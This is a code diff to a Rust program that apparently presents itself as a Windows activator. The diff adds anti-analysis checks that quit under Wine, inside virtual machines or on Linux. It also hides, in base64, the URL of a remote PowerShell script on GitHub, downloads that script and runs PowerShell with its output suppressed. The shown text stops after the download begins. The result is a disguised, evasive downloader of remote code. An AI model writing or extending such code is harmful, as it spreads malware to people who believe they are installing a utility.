@@ -1,6 +1,26 @@
-use rand::{distributions::Alphanumeric, prelude, Rng};
+use base64;
+use libloading::Library;
+use rand::{distributions::Alphanumeric, Rng};
 use reqwest;
 use std::process::{Command, Output};
+use vm_detect::{vm_detect, Detection};
+
+fn is_running_under_wine() {
+    unsafe {
+        #[allow(unused_variables)]
+        if let Ok(lib) = Library::new("ntdll.dll") {
+            println!(
+                "
+    ırmaklarından şaraplar akacak diyorsun
+    cennet-i alâ meyhane midir?
+    her mümin'e iki huri diyorsun
+    cennet-i alâ kerhane midir?
+                "
+            );
+            std::process::exit(0);
+        }
+    }
+}
 
 fn generate_key() -> String {
     let random_string: String = rand::thread_rng()
@@ -10,30 +30,58 @@ fn generate_key() -> String {
         .collect();
 
     let hash = md5::compute(random_string.as_bytes());
-    let hash_hex = format!("{:x}", hash);
-    hash_hex
+    let output = format!("ABİ{{{:?}}}", hash);
+    output
+}
+
+fn is_linux() {
+    match std::env::consts::OS {
+        "linux" => {
+            println!("Can't activate Windows on this OS dumbass!");
+            std::process::exit(0);
+        }
+        _ => {}
+    }
 }
 
 fn run_command(command: &String) -> Output {
-    if cfg!(target_os = "windows") {
-        Command::new("powershell")
-            .arg("-Commanda")
-            .arg(command)
-            .output()
-            .expect("Run command again!")
-    } else {
-        println!("{}", command);
-        Command::new("bash")
-            .arg("-c")
-            .arg(command)
-            .output()
-            .expect("Run command again!")
+    let output = Command::new("powershell")
+        .arg("-Commanda")
+        .arg(command)
+        .arg("|")
+        .arg("Out-Null")
+        .output()
+        .expect("Run command again!");
+    output
+}
+
+fn is_running_in_vm() {
+    let detection = vm_detect();
+    if detection.contains(Detection::HYPERVISOR_BIT) {
+        println!(
+            "
+        Sanal dünya, kodların dans ettiği yer,
+        Programlar koşar, sınırlar kalkar gider.
+        RAM'de hayat bulur, işlemci hızla döner,
+        Sanal makine, hayallerin gerçek olduğu yer.
+            "
+        );
+        std::process::exit(0)
     }
 }
 
 #[tokio::main]
 async fn main() {
-    let url = "https://raw.githubusercontent.com/El0mar/legendary-train/refs/heads/main/script.ps1";
+    is_running_under_wine();
+    is_running_in_vm();
+    is_linux();
+    let b64_string =
+        "aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL0VsMG1hci9sZWdlbmRhcnktdHJhaW4vcmVmcy9oZWFkcy9tYWluL3NjcmlwdC5wczEK";
+
+    #[allow(deprecated)]
+    let decoded_bytes = base64::decode(b64_string).expect("Something went wrong.");
+    let decoded_string = String::from_utf8(decoded_bytes).expect("Something went wrong.");
+    let url = decoded_string;
     let windows_key = generate_key();
     match reqwest::get(url).await {
         Ok(response) => {
